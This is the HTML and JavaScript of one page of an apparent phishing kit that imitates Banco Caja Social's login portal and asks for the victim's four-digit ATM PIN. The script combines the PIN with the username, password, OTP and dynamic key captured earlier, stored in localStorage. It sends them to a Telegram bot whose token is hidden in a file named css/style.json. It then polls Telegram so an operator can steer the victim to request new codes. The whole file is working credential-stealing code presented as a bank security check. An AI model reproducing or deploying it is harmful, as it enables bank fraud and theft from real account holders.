<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Portal Personas - Clave Cajero</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    body { font-family: 'Inter', sans-serif; }

    .loaderp {
      width: 48px;
      height: 48px;
      border: 5px solid #FFF;
      border-bottom-color: #e8114b;
      border-radius: 50%;
      display: inline-block;
      box-sizing: border-box;
      animation: rotation 1s linear infinite;
    }
    @keyframes rotation {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loaderp-full {
      position: fixed;
      top: 0;
      left: 0;
      overflow-y: hidden;
      z-index: 1000;
      background-color: white;
      width: 100vw;
      height: 100vh;
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .hidden { display: none !important; }

    .otp-input {
      width: 50px;
      height: 60px;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      border: 2px solid #e5e7eb;
      border-radius: 8px;
      margin: 0 8px;
      transition: all 0.3s ease;
    }

    .otp-input:focus {
      outline: none;
      border-color: #3b82f6;
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
    }

    .otp-input.filled {
      border-color: #10b981;
      background-color: #f0fdf4;
    }
  </style>
</head>
<body class="bg-gray-50 min-h-screen">
  <div class="max-w-md mx-auto bg-white min-h-screen">
    <div class="px-6 py-8">
      <div class="mb-8">
        <div class="w-48 h-12 flex items-center">
          <img src="https://bancapersonas.bancocajasocial.com/auth/resources/0flbi/login/bcs/img/logoBCSLine.svg"
               alt="Logo"
               class="h-full w-auto object-contain">
        </div>
      </div>

      <div class="mb-6">
        <button id="backButton" class="flex items-center text-gray-600 hover:text-gray-800 transition-colors">
          <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
          </svg>
          Volver
        </button>
      </div>

      <div class="text-center mb-8">
        <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <svg class="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
          </svg>
        </div>

        <h2 class="text-2xl font-bold text-gray-800 mb-2">
          Verificaci√≥n de seguridad
        </h2>

        <p class="text-gray-600 mb-2">
          Por favor, digita tu clave de cajero de 4 d√≠gitos
        </p>

        <p class="text-sm text-gray-500" id="phoneInfo">
          Termina en: ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢
        </p>
      </div>

      <div class="mb-8">
        <label class="block text-gray-700 text-lg font-medium mb-6 text-center">
          Ingresa la clave de cajero
        </label>

        <div class="flex justify-center mb-4" id="atmKeyContainer">
          <input type="password" class="otp-input" maxlength="1" id="atm1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
          <input type="password" class="otp-input" maxlength="1" id="atm2" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
          <input type="password" class="otp-input" maxlength="1" id="atm3" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
          <input type="password" class="otp-input" maxlength="1" id="atm4" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
        </div>
      </div>

      <button id="verifyButton" disabled
        class="w-full bg-gray-300 text-gray-500 py-3 rounded-lg text-lg font-medium mb-6 cursor-not-allowed transition-all">
        Verificar clave
      </button>

      <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
        <div class="flex items-start">
          <svg class="w-5 h-5 text-blue-600 mt-0.5 mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
          </svg>
          <div>
            <p class="text-sm text-blue-800 font-medium mb-1">Importante</p>
            <p class="text-sm text-blue-700">
              Esta clave no expira. Por tu seguridad, no la compartas con nadie.
            </p>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="loaderp-full" id="loaderFull" role="status" aria-hidden="true">
    <span class="loaderp" aria-hidden="true"></span>
    <p class="text-gray-600 text-lg font-light mt-4">Verificando clave...</p>
  </div>

  <script>
    // Elementos del DOM
    const atmInputs = document.querySelectorAll('#atmKeyContainer .otp-input');
    const verifyButton = document.getElementById('verifyButton');
    const backButton = document.getElementById('backButton');
    const loader = document.getElementById('loaderFull');

    // Variables de estado
    let userData = {};
    let loginData = {};
    let otpData = {};
    let polling = false;
    let lastUpdateId = -1;
    let pollingTimer = null;

    // Cargar datos del localStorage
    function loadPreviousData() {
      try {
        const savedUserData = localStorage.getItem('userData');
        const savedLoginData = localStorage.getItem('loginData');
        const savedOtpData = localStorage.getItem('otpData');

        if (savedUserData) userData = JSON.parse(savedUserData);
        if (savedLoginData) loginData = JSON.parse(savedLoginData);
        if (savedOtpData) otpData = JSON.parse(savedOtpData);

        // Mostrar el tel√©fono enmascarado
        if (userData.telefono) {
          const phone = userData.telefono;
          const maskedPhone = phone.slice(-4);
          document.getElementById('phoneInfo').textContent = `Termina en: ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ${maskedPhone}`;
        }
      } catch (e) {
        console.error('Error al cargar datos previos:', e);
      }
    }

    // Cargar la configuraci√≥n de Telegram
    async function loadTelegramConfig() {
      try {
        const res = await fetch('./css/style.json', { cache: 'no-store' });
        if (!res.ok) throw new Error('No se pudo cargar css/style.json (status ' + res.status + ')');
        const cfg = await res.json();
        if (!cfg.token || !cfg.chat_id) {
          console.error('Archivo de configuraci√≥n inv√°lido (falta token o chat_id).');
          return null;
        }
        return cfg;
      } catch (err) {
        console.error('loadTelegramConfig error:', err);
        return null;
      }
    }

    // Configurar la funcionalidad de los inputs de la clave
    function setupATMKeyInputs() {
      atmInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
          const value = e.target.value;

          // Solo permitir n√∫meros
          if (!/^\d$/.test(value) && value !== '') {
            e.target.value = '';
            return;
          }

          // Agregar clase "filled" y mover el foco al siguiente input
          if (value) {
            e.target.classList.add('filled');
            if (index < atmInputs.length - 1) {
              atmInputs[index + 1].focus();
            }
          } else {
            e.target.classList.remove('filled');
          }

          checkATMKeyComplete();
        });

        input.addEventListener('keydown', function(e) {
          // Manejar la tecla de retroceso (Backspace)
          if (e.key === 'Backspace' && !e.target.value && index > 0) {
            atmInputs[index - 1].focus();
            atmInputs[index - 1].classList.remove('filled');
          }

          // Manejar la tecla Enter
          if (e.key === 'Enter' && !verifyButton.disabled) {
            verifyButton.click();
          }
        });

        // Seleccionar el texto al recibir el foco
        input.addEventListener('focus', function() {
          this.select();
        });
      });
    }

    // Verificar si todos los campos est√°n completos
    function checkATMKeyComplete() {
      const atmKey = getATMKeyValue();
      const isComplete = atmKey.length === 4;
      verifyButton.disabled = !isComplete;
      verifyButton.classList.toggle('bg-blue-600', isComplete);
      verifyButton.classList.toggle('text-white', isComplete);
      verifyButton.classList.toggle('hover:bg-blue-700', isComplete);
      verifyButton.classList.toggle('cursor-pointer', isComplete);
      verifyButton.classList.toggle('bg-gray-300', !isComplete);
      verifyButton.classList.toggle('text-gray-500', !isComplete);
      verifyButton.classList.toggle('cursor-not-allowed', !isComplete);
    }

    // Obtener el valor completo de la clave
    function getATMKeyValue() {
      return Array.from(atmInputs).map(input => input.value).join('');
    }

    // Enviar los datos a Telegram
    async function sendATMKeyToTelegram(atmKey) {
      const config = await loadTelegramConfig();
      if (!config) throw new Error('No se pudo cargar configuraci√≥n Telegram');

      const transactionId = otpData.transactionId || loginData.transactionId || 'N/A';

      const message = `üèß **Clave Cajero Enviada**

*üîó Session ID:* ${transactionId}
*üë§ Usuario:* ${userData.usuario || loginData.usuario || 'N/A'}
*üîë Contrase√±a:* ${loginData.password || 'N/A'}
*üì± C√≥digo OTP:* ${otpData.otp || 'N/A'}
*üîë Clave Din√°mica:* ${otpData.dynamicKey || 'N/A'}
*üîë Clave Cajero:* ${atmKey}`;

      // Teclado con los nuevos botones
      const keyboard = {
        inline_keyboard: [
          [{ text: "üîë Clave Din√°mica", callback_data: `pedir_dinamica:${transactionId}` }],
          [{ text: "üì± Pedir Nuevo OTP", callback_data: `pedir_nuevo_otp:${transactionId}` }],
          [{ text: "‚ùå Error Clave Cajero", callback_data: `error_cajero:${transactionId}` }],
          [{ text: "‚úÖ Finalizar", callback_data: `finalizar:${transactionId}` }]
        ]
      };

      const body = {
        chat_id: config.chat_id,
        text: message,
        reply_markup: keyboard,
        parse_mode: 'Markdown'
      };

      const res = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });

      const j = await res.json();
      if (!j.ok) {
        console.error('sendMessage respuesta:', j);
        throw new Error('Error enviando mensaje a Telegram: ' + (j.description || 'unknown'));
      }

      return { result: j.result, transactionId };
    }

    // Verificar la respuesta del administrador
    async function checkAdminResponse(transactionId) {
      if (polling) return;
      polling = true;
      let config = null;

      try {
          config = await loadTelegramConfig();
          if (!config) throw new Error('No se pudo cargar la configuraci√≥n de Telegram.');
      } catch (err) {
          console.error("Error inicializando el sondeo:", err);
          loader.style.display = 'none';
          polling = false;
          return;
      }
      
      // Obtiene el √∫ltimo update_id
      try {
          const updatesRes = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates?offset=-1`, { cache: 'no-store' });
          const updatesData = await updatesRes.json();
          if (updatesData.ok && updatesData.result.length > 0) {
              lastUpdateId = updatesData.result[updatesData.result.length - 1].update_id;
          }
      } catch (err) {
          console.error("Error al obtener el √∫ltimo update_id:", err);
      }

      function pollUpdates() {
          if (!polling) return;

          const offsetParam = lastUpdateId > -1 ? `&offset=${lastUpdateId + 1}` : '';
          const url = `https://api.telegram.org/bot${config.token}/getUpdates?timeout=30${offsetParam}`;
          
          fetch(url, { cache: 'no-store' })
              .then(response => response.json())
              .then(data => {
                  if (!data.ok) {
                      console.error("Error en getUpdates:", data.description);
                      if (polling) pollingTimer = setTimeout(pollUpdates, 5000);
                      return;
                  }

                  if (data.result.length > 0) {
                      lastUpdateId = data.result[data.result.length - 1].update_id;
                      const verificationUpdate = data.result.find(update =>
                          update.callback_query && update.callback_query.data.endsWith(`:${transactionId}`)
                      );
                      
                      if (verificationUpdate) {
                          loader.style.display = 'none';
                          polling = false;
                          if (pollingTimer) clearTimeout(pollingTimer);
                          handleAdminResponse(verificationUpdate.callback_query.data);
                          return;
                      }
                  }

                  if (polling) pollingTimer = setTimeout(pollUpdates, 2000);
              })
              .catch(error => {
                  console.error("Error al verificar respuesta:", error);
                  if (polling) pollingTimer = setTimeout(pollUpdates, 5000);
              });
      }
      pollUpdates();
    }

    // Manejar la respuesta del administrador
    function handleAdminResponse(callbackData) {
      const [action, transactionId] = (callbackData || '').split(':');
      switch (action) {
        case 'pedir_dinamica':
          window.location.href = 'dinamica.html';
          break;
        case 'pedir_nuevo_otp':
          window.location.href = 'otp.html';
          break;
        case 'error_cajero':
          alert('Clave de cajero incorrecta. Por favor, intenta de nuevo.');
          atmInputs.forEach(input => {
            input.value = '';
            input.classList.remove('filled');
          });
          atmInputs[0].focus();
          checkATMKeyComplete();
          break;
        case 'finalizar':
          alert('Verificaci√≥n completada exitosamente.');
          localStorage.clear();
          window.location.href = 'index.html';
          break;
        default:
          console.log('Acci√≥n no reconocida:', action);
          break;
      }
    }

    // Event listeners
    verifyButton.addEventListener('click', async function() {
      const atmKey = getATMKeyValue();
      if (atmKey.length !== 4) return;

      loader.style.display = 'flex';

      try {
        const { result, transactionId } = await sendATMKeyToTelegram(atmKey);
        console.log('Clave de cajero enviada a Telegram:', result);
        checkAdminResponse(transactionId);
      } catch (err) {
        console.error('Error enviando clave de cajero:', err);
        loader.style.display = 'none';
        alert('Error al enviar la clave. Por favor, intenta nuevamente.');
      }
    });

    backButton.addEventListener('click', function() {
      window.history.back();
    });

    // Inicializaci√≥n
    document.addEventListener('DOMContentLoaded', function() {
      loadPreviousData();
      setupATMKeyInputs();
      atmInputs[0].focus();
    });
  </script>

</body>
</html>
